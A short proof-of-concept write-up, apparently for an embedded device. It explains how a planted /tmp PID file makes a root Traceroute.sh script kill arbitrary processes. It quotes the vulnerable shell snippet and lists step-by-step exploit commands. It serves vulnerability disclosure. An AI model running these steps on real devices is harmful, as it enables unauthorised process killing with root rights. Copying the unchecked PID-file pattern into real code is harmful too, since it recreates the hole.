# Kill Processes as Root

This document describes how a user with access to the shell and to the
web interface is able to kill processes with root rights.

## Description

The web interface allows the execution of traceroute and ping. Both processes
are run by root? (to be verified). To block multiple executions of ping
and traceroute a PID file is created.

PID file for Traceroute: `/tmp/Traceroute_Device.IP.Diagnostics.TraceRoute`

If the user starts a new traceroute from the web the `/etc/ah/Traceroute.sh`
will be called. One of the first lines states:

```sh
[ -e /tmp/Traceroute_${obj}.pid ] && for pid in `cat /tmp/Traceroute_${obj}.pid`;
  do kill $pid;
done;
rm /tmp/Traceroute_${obj}.pid;
killall traceroute;
```

We now know all PID's in the file will be killed (as well as all other
traceroute processes) but the important part:
*This PID file doesn't exist on startup* so if you create it on your own you can
fill it with whatever PID's you want.

## Steps

 1. Get shell access (see [Escape from CLISH](/poc/escape_clish))
 2. `PIDFILE=/tmp/Traceroute_Device.IP.Diagnostics.TraceRoute`
 3. Choose which process you want to kill
   * List processes with `ps` (aux not needed ;)
   * `PIDS="1234 2345"`
 4. `ls $PIDFILE`
   * Reboot if the file exists and start from the beginning.
     (Exit shell and type `reboot`)
 5. Create file
   * `echo "$PIDS">$PIDFILE`
 6. Start traceroute to random host from web interface
 7. ????
 8. PROFIT!!!
